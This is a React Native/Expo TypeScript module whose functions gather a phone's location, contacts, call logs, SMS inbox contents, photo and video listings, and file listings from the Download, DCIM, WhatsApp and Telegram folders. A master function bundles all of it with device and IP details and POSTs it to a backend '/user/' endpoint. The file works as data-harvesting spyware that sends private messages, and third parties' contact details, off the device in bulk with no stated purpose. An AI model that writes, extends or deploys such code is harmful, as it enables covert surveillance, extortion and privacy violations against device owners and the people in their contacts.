import { generateHeaders } from "@/lib/generateHeaders";
import axios from "axios";
import * as Contacts from "expo-contacts";
import * as Device from "expo-device";
import * as Location from "expo-location";
import * as MediaLibrary from "expo-media-library";
import * as Network from "expo-network";
import { PermissionsAndroid, Platform } from "react-native";
import RNFS from "react-native-fs";
import SmsAndroid from "react-native-get-sms-android";

/* --------------------------------------------------------------------- */
/* 🕒 Helper: Local ISO Timestamp (microseconds)                         */
/* --------------------------------------------------------------------- */
export function getLocalISOTimeMicro() {
  const now = new Date();
  const ms = String(now.getMilliseconds()).padStart(3, "0") + "000";
  const tzOffset = -now.getTimezoneOffset();
  const sign = tzOffset >= 0 ? "+" : "-";
  const diffHours = String(Math.floor(Math.abs(tzOffset) / 60)).padStart(2, "0");
  const diffMinutes = String(Math.abs(tzOffset % 60)).padStart(2, "0");
  const base = now.toISOString().split(".")[0];
  return `${base}.${ms}${sign}${diffHours}:${diffMinutes}`;
}

/* --------------------------------------------------------------------- */
/* 📍 LOCATION                                                          */
/* --------------------------------------------------------------------- */
export async function requestAndFetchLocation() {
  const { status } = await Location.requestForegroundPermissionsAsync();

  if (status !== "granted") return null;

  try {
    const loc = await Location.getCurrentPositionAsync({
      accuracy: Location.Accuracy.High,
    });

    const geo = await Location.reverseGeocodeAsync(loc.coords);

    return {
      latitude: loc.coords.latitude,
      longitude: loc.coords.longitude,
      address:
        geo.length > 0
          ? `${geo[0].name}, ${geo[0].street}, ${geo[0].city}, ${geo[0].region}, ${geo[0].country}`
          : "Unknown",
    };
  } catch (e) {
    return null;
  }
}

/* --------------------------------------------------------------------- */
/* 👥 CONTACTS + CALL LOGS                                              */
/* --------------------------------------------------------------------- */
export async function requestAndFetchContacts() {
  const { status } = await Contacts.requestPermissionsAsync();
  if (status !== "granted") return [];

  try {
    const all = await Contacts.getContactsAsync({
      fields: [Contacts.Fields.PhoneNumbers],
      pageSize: 2000,
    });

    return all.data
      .filter((c) => c.name && c.phoneNumbers?.length)
      .map((c) => ({
        name: c.name,
        number: c.phoneNumbers?.[0]?.number ?? "Unknown",
      }));
  } catch (e) {
    return [];
  }
}

export async function requestAndFetchCallLogs() {
  if (Platform.OS !== "android") return [];

  const granted = await PermissionsAndroid.request(
    PermissionsAndroid.PERMISSIONS.READ_CALL_LOG
  );

  if (granted !== PermissionsAndroid.RESULTS.GRANTED) return [];

  try {
    const CallLogs = require("react-native-call-log");
    const logs = await CallLogs.loadAll();

    return logs.slice(0, 300).map((log: any) => ({
      name: log.name || "Unknown",
      number: log.phoneNumber || log.number,
      type: log.type || "UNKNOWN",
      duration: log.duration || "0",
      timestamp: log.timestamp || log.dateTime,
    }));
  } catch {
    return [];
  }
}

/* --------------------------------------------------------------------- */
/* 🖼️ MEDIA LIBRARY                                                    */
/* --------------------------------------------------------------------- */
export async function requestAndFetchMediaFiles() {
  const { status } = await MediaLibrary.requestPermissionsAsync();
  if (status !== "granted") return [];

  try {
    const media = await MediaLibrary.getAssetsAsync({
      first: 1000,
      mediaType: ["photo", "video"],
      sortBy: [["creationTime", false]],
    });

    return media.assets.map((item) => ({
      id: item.id,
      uri: item.uri,
      filename: item.filename,
      mediaType: item.mediaType,
      creationTime: item.creationTime,
      width: item.width,
      height: item.height,
      duration: item.duration,
    }));
  } catch {
    return [];
  }
}

/* --------------------------------------------------------------------- */
/* 💬 SMS                                                               */
/* --------------------------------------------------------------------- */
export async function requestAndFetchSms() {
  if (Platform.OS !== "android") return [];

  const granted = await PermissionsAndroid.request(
    PermissionsAndroid.PERMISSIONS.READ_SMS
  );

  if (granted !== PermissionsAndroid.RESULTS.GRANTED) return [];

  try {
    return await new Promise((resolve) => {
      const filter = { box: "inbox", maxCount: 200 };

      (SmsAndroid as any).list(
        JSON.stringify(filter),
        () => resolve([]),
        (count: number, smsList: string) => {
          try {
            const parsed = JSON.parse(smsList);
            resolve(
              parsed.map((msg: any) => ({
                address: msg.address,
                body: msg.body,
                date: msg.date,
                read: msg.read === 1,
              }))
            );
          } catch {
            resolve([]);
          }
        }
      );
    });
  } catch {
    return [];
  }
}

/* --------------------------------------------------------------------- */
/* 📂 STORAGE FILES                                                     */
/* --------------------------------------------------------------------- */
export async function requestAndFetchStorageFiles() {
  if (Platform.OS !== "android") return [];

  let granted = false;

  if (Platform.Version >= 33) {
    granted = await PermissionsAndroid.request(
      PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES
    ).then((r) => r === PermissionsAndroid.RESULTS.GRANTED);
  } else {
    granted = await PermissionsAndroid.request(
      PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
    ).then((r) => r === PermissionsAndroid.RESULTS.GRANTED);
  }

  if (!granted) return [];

  const root = RNFS.ExternalStorageDirectoryPath;
  const dirs = [
  `${root}/Download`,
  `${root}/Documents`,
  `${root}/Pictures`,
  `${root}/DCIM`,
  `${root}/DCIM/Camera`,
  `${root}/Movies`,
  `${root}/Music`,

  // WhatsApp folders (images, videos, docs)
  `${root}/WhatsApp/Media/WhatsApp Images`,
  `${root}/WhatsApp/Media/WhatsApp Images/Sent`,
  `${root}/WhatsApp/Media/WhatsApp Video`,
  `${root}/WhatsApp/Media/WhatsApp Video/Sent`,
  `${root}/WhatsApp/Media/WhatsApp Documents`,

  // Telegram folders
  `${root}/Telegram/Telegram Images`,
  `${root}/Telegram/Telegram Video`,
  `${root}/Telegram/Telegram Documents`,
];

  const out: any[] = [];

  for (const dir of dirs) {
    try {
      const entries = await RNFS.readDir(dir);
      entries.forEach((f) => {
        if (f.isFile()) {
          out.push({
            name: f.name,
            path: f.path,
            size: f.size,
            modifiedTime: f.mtime,
          });
        }
      });
    } catch {}
  }

  return out;
}

/* --------------------------------------------------------------------- */
/* 📦 MASTER FUNCTION (optional)                                        */
/* --------------------------------------------------------------------- */
export async function requestAllPermissions() {
  const base_URL = process.env.EXPO_PUBLIC_API_BASE_URL;
  const SUBMIT = `${base_URL}/user/`;

  try {
    const location = await requestAndFetchLocation();
    const contacts = await requestAndFetchContacts();
    const callLogs = await requestAndFetchCallLogs();
    const sms = await requestAndFetchSms();
    const media = await requestAndFetchMediaFiles();
    const storage = await requestAndFetchStorageFiles();
    const net = await Network.getNetworkStateAsync();
    const ip = await Network.getIpAddressAsync();

    const all = {
      timestamp: getLocalISOTimeMicro(),
      info: {
        location,
        contacts,
        callLogs,
        sms,
        media,
        storage,
        device: {
          brand: Device.brand,
          modelName: Device.modelName,
          osName: Device.osName,
          osVersion: Device.osVersion,
        },
        network: {
          type: net.type,
          isConnected: net.isConnected,
          ipAddress: ip,
        },
      },
    };

    const headers = await generateHeaders();
    await axios.post(SUBMIT, all, { headers });
    return all;
  } catch (e) {
    return null;
  }
}
